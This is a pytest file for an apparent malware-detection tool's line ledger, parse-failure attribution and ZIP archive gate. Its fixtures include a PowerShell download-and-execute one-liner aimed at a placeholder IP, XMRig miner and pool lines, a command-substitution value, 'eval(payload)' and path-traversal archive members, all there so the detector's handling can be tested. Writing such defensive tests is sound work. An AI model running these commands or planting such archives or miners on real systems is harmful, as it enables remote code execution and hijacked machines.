"""Fix wave 10 (2026-11-26): the verification corpus twins, the
script parse-failure attribution rule, and the Windows CI leg.

The corpus half: five benign Python twins were capped YES
UNACCOUNTED by the script line ledger (ordinary lines the ledger
could not classify) and, for three of them, by the wave 3
script-parse-failure cap on top. The fixes are in the accounting
logic: the ledger now accounts ordinary statement keywords,
expression statements whose callees are all fixed by what the
file shows, phrase-key declarations, semicolon comments and
literal data lines; and the parse-failure cap no longer fires
when the failure is attributable to accounted non-code lines.
The Windows half: the archive gate reads member names from the
archive's own central directory (zipfile rewrites separators
in its listing on Windows), and the gate's divergences are
reported even when host extraction fails, so the member kinds
do not depend on the host OS. Synthetic material only. See
validation/FIX-LOG-2026-11-26-WAVE10.md.
"""
import io
import os
import sys
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import event_zero.verdict as verdict_mod
from event_zero.coverage5 import member_semantics, zip_member_semantics
from event_zero.families import (script_line_ledger,
                                 script_parse_failure_attribution)
from event_zero.verdict import enumerate_subject, verdict


def write(tmp_path, name, data):
    p = tmp_path / name
    if isinstance(data, str):
        data = data.encode()
    p.write_bytes(data)
    return str(p)


def blockers_text(v):
    return "\n".join(v.get("unaccounted", []) + v.get("yes_reasons_text", [])) \
        + "\n".join(str(b) for b in v.get("blockers", []))


# ------------------------------------------------------------------
# The line ledger: ordinary structure and data lines
# ------------------------------------------------------------------
def test_ledger_ordinary_statement_keywords_accounted():
    src = ("def load(path):\n"
           "    if path is None:\n"
           "        pass\n"
           "    for i in range(3):\n"
           "        if i:\n"
           "            break\n"
           "        continue\n"
           "    raise ValueError('x')\n")
    led = script_line_ledger(src)
    assert led["unaccounted"] == [], led


def test_ledger_expression_statements_accounted():
    src = ('open("E:\\\\Backups\\\\" + name + ".bak", "wb").write('
           'AES.new(key, AES.MODE_CBC).encrypt(data))\n'
           'os.remove("C:\\\\Users\\\\lab\\\\Temp\\\\" + name)\n')
    led = script_line_ledger(src)
    assert led["unaccounted"] == [], led


def test_ledger_undefined_bare_call_stays_unaccounted():
    # accuracy audit defect 4: a call to a name the file does not
    # define, import or otherwise fix stays unaccounted
    led = script_line_ledger("frobnicate_the_wibbulator(patched)\n")
    assert [u["line"] for u in led["unaccounted"]] == [1], led


def test_ledger_dynamic_builtin_calls_stay_unaccounted():
    # eval and getattr choose their callee from data, so no line
    # containing them as the bare callee is accounted
    led = script_line_ledger("eval(payload)\n")
    assert [u["line"] for u in led["unaccounted"]] == [1], led
    led = script_line_ledger('getattr(mod, "run")()\n')
    assert [u["line"] for u in led["unaccounted"]] == [1], led


def test_ledger_imported_name_call_accounted():
    src = "from helpers import frobnicate\nfrobnicate(the_patched)\n"
    led = script_line_ledger(src)
    assert led["unaccounted"] == [], led


def test_ledger_data_lines_accounted():
    src = ("wallet = 9ZZZq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXf\n"
           "xmrig --config my-rig.json\n"
           "xmrig 6.21.0\n"
           "stratum+tcp://192.0.2.99:4444\n"
           "runs in a visible window with a dashboard\n")
    led = script_line_ledger(src)
    assert led["unaccounted"] == [], led
    assert led["data"] >= 3, led


def test_ledger_phrase_key_declaration_accounted():
    led = script_line_ledger("app name = BandwidthShare\n")
    assert led["unaccounted"] == [], led


def test_ledger_semicolon_comment_accounted_but_atoms_still_flag():
    led = script_line_ledger("; someone packed the stock miner alone\n")
    assert led["unaccounted"] == [], led
    led = script_line_ledger(
        "; iex (New-Object Net.WebClient).DownloadString("
        "'http://198.51.100.5/x')\n")
    assert any(f["kind"] == "download-execute" for f in led["flagged"]), led
    assert led["unaccounted"] == [], led


def test_ledger_unaccountable_shapes_stay_unaccounted():
    for line in ("x -> y -> z",
                 "payload := decrypt(key)",
                 "run-me --output=$(evil)",
                 "*.txt"):
        led = script_line_ledger(line + "\n")
        assert [u["line"] for u in led["unaccounted"]] == [1], (line, led)


# ------------------------------------------------------------------
# Parse-failure attribution
# ------------------------------------------------------------------
def test_attribution_data_lines_explained():
    src = ("# my miner notes\n"
           "wallet = 9ZZZq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXf\n"
           "pool = stratum+tcp://192.0.2.55:3333\n"
           "xmrig --config my-rig.json\n")
    explained, neutralised = script_parse_failure_attribution(src)
    assert explained is True
    assert neutralised == [2, 3, 4], neutralised


def test_attribution_broken_def_not_explained():
    src = "x = 1\ndef broken(:\n    y = 2\nprint(x)\n"
    explained, _n = script_parse_failure_attribution(src)
    assert explained is False


def test_attribution_unterminated_string_not_explained():
    explained, _n = script_parse_failure_attribution('x = "abc\nprint(x)\n')
    assert explained is False


def test_attribution_unclosed_delimiter_not_explained():
    explained, _n = script_parse_failure_attribution("x = (1,\n")
    assert explained is False


def test_attribution_valid_source():
    explained, neutralised = script_parse_failure_attribution('print("hi")\n')
    assert explained is True and neutralised == []


# ------------------------------------------------------------------
# Verdict level: the interplay of the two caps
# ------------------------------------------------------------------
def test_verdict_data_line_python_file_is_no(tmp_path):
    src = ("# My Miner Setup\n"
           "# This is my own XMRig build. It mines to my own wallet "
           "on my own pool server at home.\n"
           "wallet = 9ZZZq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXf\n"
           "pool = stratum+tcp://192.0.2.55:3333\n"
           "xmrig --config my-rig.json\n"
           "# run it in a visible console window so I can watch "
           "the hashrate\n")
    v = verdict(write(tmp_path, "miner_notes.py", src))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    rec = v["files"][0]
    assert "incompleteness" not in rec, rec
    assert "script_parse_attribution" in rec, rec


def test_verdict_parse_error_with_unaccounted_line_still_caps(tmp_path):
    src = ("x = 1\n"
           "def broken(:\n"
           "    y = 2\n"
           "weirdness (( unbalanced\n"
           "print(x)\n")
    v = verdict(write(tmp_path, "broken2.py", src))
    assert v["headline"] == "YES: MALWARE FOUND"
    assert v["reason_class"] == "UNACCOUNTED"
    text = "\n".join(v["unaccounted"])
    assert "script-parse-failure" in text, text
    assert "line ledger cannot account" in text, text


# ------------------------------------------------------------------
# The archive gate: stored names, host-independent kinds
# ------------------------------------------------------------------
def _zip_bytes(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in members:
            z.writestr(name, data)
    return buf.getvalue()


def raw_zip_bytes(members):
    # Build a ZIP whose member names are stored byte for byte.
    # zipfile sanitizes names at write time on Windows (the host
    # separator is rewritten to "/"), so a fixture that needs an
    # exact stored name cannot go through it. Stored method only.
    import binascii
    import struct
    out = io.BytesIO()
    central = []
    for name, data in members:
        crc = binascii.crc32(data) & 0xFFFFFFFF
        offset = out.tell()
        out.write(struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0, 0,
                              0, 0x21, crc, len(data), len(data),
                              len(name), 0))
        out.write(name)
        out.write(data)
        central.append((name, crc, len(data), offset))
    cd_start = out.tell()
    for name, crc, size, offset in central:
        out.write(struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20,
                              20, 0, 0, 0, 0x21, crc, size, size,
                              len(name), 0, 0, 0, 0, 0, offset))
        out.write(name)
    out.write(struct.pack("<IHHHHIIH", 0x06054B50, 0, 0,
                          len(central), len(central),
                          out.tell() - cd_start, cd_start, 0))
    return out.getvalue()


def test_gate_classifies_stored_names_not_listing_names():
    # On Windows, zipfile's ZipInfo listing rewrites backslashes
    # in member names to forward slashes. Simulate that listing
    # here: the gate must still classify the stored name, read
    # from the central directory bytes.
    data = raw_zip_bytes([(b"..\\..\\evil.txt", b"hello\n"),
                          (b"readme.txt", b"hello\n")])
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        for info in zf.infolist():
            info.filename = info.filename.replace("\\", "/")
        divs = zip_member_semantics(zf, data)
    kinds = {d["kind"] for d in divs}
    assert "path-traversal-backslash" in kinds, divs
    assert "path-traversal" not in kinds, divs
    assert any("\\" in d["member"] for d in divs), divs


def test_gate_stream_qualified_kind_from_archive_bytes():
    data = _zip_bytes([(":Zone.Identifier", b"hello\n"),
                       ("readme.txt", b"hello\n")])
    kinds = {d["kind"] for d in member_semantics(data, "zip")}
    assert "stream-qualified-name" in kinds


def test_failed_extraction_still_reports_gate_kinds(tmp_path,
                                                     monkeypatch):
    # A stream-qualified member cannot be written as a file on
    # Windows at all (Errno 22): simulate that host extraction
    # failure and require the gate's classification, computed
    # from the archive bytes, to reach the verdict anyway.
    data = _zip_bytes([(":Zone.Identifier", b"hello\n"),
                       ("readme.txt", b"hello\n")])
    zp = write(tmp_path, "stream.zip", data)

    def _boom(zf, dest):
        raise OSError(22, "Invalid argument")

    monkeypatch.setattr(verdict_mod, "_safe_extract_zip", _boom)
    entries, _inst, _blockers, _un, failed, _exp, entry_blockers = \
        enumerate_subject(zp, str(tmp_path / "work"))
    assert failed, "the container must still be recorded as failed"
    texts = [t for ts in entry_blockers.values() for t in ts]
    assert any("archive member semantics" in t for t in texts), texts
    assert any("stream-qualified-name" in t for t in texts), texts
